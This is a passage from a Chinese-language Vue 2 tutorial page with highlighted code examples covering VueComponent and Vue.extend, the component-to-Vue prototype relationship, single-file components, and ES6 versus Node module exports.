class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="VueComponent"><a href="#VueComponent" class="headerlink" title="VueComponent"></a>VueComponent</h3><p><img src="https://gitee.com/bluebanister/image/raw/master//img/202202141648233.png" alt="image-20220214164840817"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">title</span>&gt;</span>VueComponent<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- </span></span></span><br><span class="line"><span class="comment"><span class="xml">关于VueComponent：</span></span></span><br><span class="line"><span class="comment"><span class="xml">1.school组件本质是一个名为VueComponent的构造函数，且不是程序员定义的，是Vue.extend生成的。</span></span></span><br><span class="line"><span class="comment"><span class="xml"></span></span></span><br><span class="line"><span class="comment"><span class="xml">2.我们只需要写&lt;school/&gt;或&lt;school&gt;&lt;/school&gt;，Vue解析时会帮我们创建school组件的实例对象，</span></span></span><br><span class="line"><span class="comment"><span class="xml">即Vue帮我们执行的：new VueComponent(options)。</span></span></span><br><span class="line"><span class="comment"><span class="xml"></span></span></span><br><span class="line"><span class="comment"><span class="xml">3.特别注意：每次调用Vue.extend，返回的都是一个全新的VueComponent！！！！</span></span></span><br><span class="line"><span class="comment"><span class="xml"></span></span></span><br><span class="line"><span class="comment"><span class="xml">4.关于this指向：</span></span></span><br><span class="line"><span class="comment"><span class="xml">(1).组件配置中：</span></span></span><br><span class="line"><span class="comment"><span class="xml">data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【VueComponent实例对象】。</span></span></span><br><span class="line"><span class="comment"><span class="xml">(2).new Vue(options)配置中：</span></span></span><br><span class="line"><span class="comment"><span class="xml">data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【Vue实例对象】。</span></span></span><br><span class="line"><span class="comment"><span class="xml"></span></span></span><br><span class="line"><span class="comment"><span class="xml">5.VueComponent的实例对象，以后简称vc（也可称之为：组件实例对象）。</span></span></span><br><span class="line"><span class="comment"><span class="xml">Vue的实例对象，以后简称vm。</span></span></span><br><span class="line"><span class="comment"><span class="xml">--&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 准备好一个容器--&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">school</span>&gt;</span><span class="tag">&lt;/<span class="name">school</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">hello</span>&gt;</span><span class="tag">&lt;/<span class="name">hello</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml">Vue.config.productionTip = <span class="literal">false</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="comment">//定义school组件</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">const</span> school = Vue.extend(&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">name</span>:<span class="string">&#x27;school&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">template</span>:<span class="string">`</span></span></span></span><br><span class="line"><span class="string"><span class="javascript"><span class="xml">&lt;div&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="javascript"><span class="xml">&lt;h2&gt;学校名称：&#123;&#123;name&#125;&#125;&lt;/h2&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="javascript"><span class="xml">&lt;h2&gt;学校地址：&#123;&#123;address&#125;&#125;&lt;/h2&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="javascript"><span class="xml">&lt;button @click=&quot;showName&quot;&gt;点我提示学校名&lt;/button&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="javascript"><span class="xml">&lt;/div&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="javascript"><span class="xml">`</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="function"><span class="title">data</span>(<span class="params"></span>)</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">return</span> &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">name</span>:<span class="string">&#x27;尚硅谷&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">address</span>:<span class="string">&#x27;北京&#x27;</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">methods</span>: &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="function"><span class="title">showName</span>(<span class="params"></span>)</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="built_in">console</span>.log(<span class="string">&#x27;showName&#x27;</span>,<span class="built_in">this</span>)</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;)</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">const</span> test = Vue.extend(&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">template</span>:<span class="string">`&lt;span&gt;atguigu&lt;/span&gt;`</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;)</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="comment">//定义hello组件</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">const</span> hello = Vue.extend(&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">template</span>:<span class="string">`</span></span></span></span><br><span class="line"><span class="string"><span class="javascript"><span class="xml">&lt;div&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="javascript"><span class="xml">&lt;h2&gt;&#123;&#123;msg&#125;&#125;&lt;/h2&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="javascript"><span class="xml">&lt;test&gt;&lt;/test&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="javascript"><span class="xml">&lt;/div&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="javascript"><span class="xml">`</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="function"><span class="title">data</span>(<span class="params"></span>)</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">return</span> &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">msg</span>:<span class="string">&#x27;你好啊！&#x27;</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">components</span>:&#123;test&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;)</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="comment">// console.log(&#x27;@&#x27;,school)</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="comment">// console.log(&#x27;#&#x27;,hello)</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="comment">//创建vm</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">const</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">components</span>:&#123;school,hello&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;)</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="一个重要的内置关系"><a href="#一个重要的内置关系" class="headerlink" title="一个重要的内置关系"></a>一个重要的内置关系</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">title</span>&gt;</span>一个重要的内置关系<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 引入Vue --&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- </span></span></span><br><span class="line"><span class="comment"><span class="xml">1.一个重要的内置关系：VueComponent.prototype.__proto__ === Vue.prototype</span></span></span><br><span class="line"><span class="comment"><span class="xml">2.为什么要有这个关系：让组件实例对象（vc）可以访问到 Vue原型上的属性、方法。</span></span></span><br><span class="line"><span class="comment"><span class="xml">--&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 准备好一个容器--&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">school</span>&gt;</span><span class="tag">&lt;/<span class="name">school</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml">Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止 vue 在启动时生成生产提示。</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">Vue.prototype.x = <span class="number">99</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="comment">//定义school组件</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">const</span> school = Vue.extend(&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">name</span>:<span class="string">&#x27;school&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">template</span>:<span class="string">`</span></span></span></span><br><span class="line"><span class="string"><span class="javascript"><span class="xml">&lt;div&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="javascript"><span class="xml">&lt;h2&gt;学校名称：&#123;&#123;name&#125;&#125;&lt;/h2&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="javascript"><span class="xml">&lt;h2&gt;学校地址：&#123;&#123;address&#125;&#125;&lt;/h2&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="javascript"><span class="xml">&lt;button @click=&quot;showX&quot;&gt;点我输出x&lt;/button&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="javascript"><span class="xml">&lt;/div&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="javascript"><span class="xml">`</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="function"><span class="title">data</span>(<span class="params"></span>)</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">return</span> &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">name</span>:<span class="string">&#x27;尚硅谷&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">address</span>:<span class="string">&#x27;北京&#x27;</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">methods</span>: &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="function"><span class="title">showX</span>(<span class="params"></span>)</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="built_in">console</span>.log(<span class="built_in">this</span>.x)</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;)</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="comment">//创建一个vm</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">const</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">data</span>:&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">msg</span>:<span class="string">&#x27;你好&#x27;</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">components</span>:&#123;school&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;)</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="comment">//定义一个构造函数</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="comment">/* function Demo()&#123;</span></span></span></span><br><span class="line"><span class="comment"><span class="javascript"><span class="xml">this.a = 1</span></span></span></span><br><span class="line"><span class="comment"><span class="javascript"><span class="xml">this.b = 2</span></span></span></span><br><span class="line"><span class="comment"><span class="javascript"><span class="xml">&#125;</span></span></span></span><br><span class="line"><span class="comment"><span class="javascript"><span class="xml">//创建一个Demo的实例对象</span></span></span></span><br><span class="line"><span class="comment"><span class="javascript"><span class="xml">const d = new Demo()</span></span></span></span><br><span class="line"><span class="comment"><span class="javascript"><span class="xml"></span></span></span></span><br><span class="line"><span class="comment"><span class="javascript"><span class="xml">console.log(Demo.prototype) //显示原型属性</span></span></span></span><br><span class="line"><span class="comment"><span class="javascript"><span class="xml"></span></span></span></span><br><span class="line"><span class="comment"><span class="javascript"><span class="xml">console.log(d.__proto__) //隐式原型属性</span></span></span></span><br><span class="line"><span class="comment"><span class="javascript"><span class="xml"></span></span></span></span><br><span class="line"><span class="comment"><span class="javascript"><span class="xml">console.log(Demo.prototype === d.__proto__)</span></span></span></span><br><span class="line"><span class="comment"><span class="javascript"><span class="xml"></span></span></span></span><br><span class="line"><span class="comment"><span class="javascript"><span class="xml">//程序员通过显示原型属性操作原型对象，追加一个x属性，值为99</span></span></span></span><br><span class="line"><span class="comment"><span class="javascript"><span class="xml">Demo.prototype.x = 99</span></span></span></span><br><span class="line"><span class="comment"><span class="javascript"><span class="xml"></span></span></span></span><br><span class="line"><span class="comment"><span class="javascript"><span class="xml">console.log(&#x27;@&#x27;,d) */</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bluebanister/image/raw/master//img/202202142027205.png" alt="image-20220214202742854"></p><h3 id="单文件组件"><a href="#单文件组件" class="headerlink" title="单文件组件"></a>单文件组件</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;demo&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>学校名称：&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>学校地址：&#123;&#123;address&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;showName&quot;</span>&gt;</span>点我提示学校名<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"> <span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">name</span>:<span class="string">&#x27;School&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="function"><span class="title">data</span>(<span class="params"></span>)</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">return</span> &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">name</span>:<span class="string">&#x27;尚硅谷&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">address</span>:<span class="string">&#x27;北京昌平&#x27;</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">methods</span>: &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="function"><span class="title">showName</span>(<span class="params"></span>)</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">alert(<span class="built_in">this</span>.name)</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"></span></span></span><br><span class="line"><span class="css"><span class="xml"><span class="selector-class">.demo</span>&#123;</span></span></span><br><span class="line"><span class="css"><span class="xml"><span class="attribute">background-color</span>: orange;</span></span></span><br><span class="line"><span class="css"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="css"><span class="xml"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h4 id="es6导出和node导出对比"><a href="#es6导出和node导出对比" class="headerlink" title="es6导出和node导出对比"></a>es6导出和node导出对比</h4><p>es6</p><ul><li><p>ES6语法中使用export导出成员或者函数，对应的导入时需要使用import</p></li><li><p>export导出默认函数和默认成员时一个模块（通常是一个js文件）只能有一个默认成员或者默认函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a=<span class="string">&quot;a&quot;</span></span><br><span class="line"><span class="keyword">let</span> b=<span class="string">&quot;b&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  a,</span><br><span class="line">  b</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> aaa <span class="keyword">from</span> <span class="string">&quot;./es6e&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">console</span>.log(aaa.a)</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1.直接一个包含多个变量、方法的对象</span></span><br><span class="line"><span class="keyword">let</span> name = <span class="string">&#x27;小明&#x27;</span>，</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sum</span> (<span class="params">num1,num2</span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> num1 + num2；</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> &#123; name,sum &#125;；</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2.在声明时就直接导出</span></span><br><span class="line"><span class="keyword">export</span>  <span class="keyword">let</span> height = <span class="number">1.88</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3.导出函数/类</span></span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">mul</span> (<span class="params">num1, num2</span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> num1*num2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="title">run</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1.导入的&#123; &#125;中定义的变量</span></span><br><span class="line"><span class="keyword">import</span> &#123;flag， sum&#125; <span class="keyword">from</span> <span class="string">&quot;./aas.js&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2.直接导入expert定义的变量</span></span><br><span class="line"><span class="keyword">import</span> &#123;num1, height&#125; <span class="keyword">from</span> <span class="string">&quot;./aaa.js&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3.expert定义的function/class</span></span><br><span class="line"><span class="keyword">import</span>&#123;mul, Person&#125; <span class="keyword">from</span> <span class="string">&quot;./aaa.js&quot;</span>;</span><br></pre></td></tr></table></figure></li></ul><p>node</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 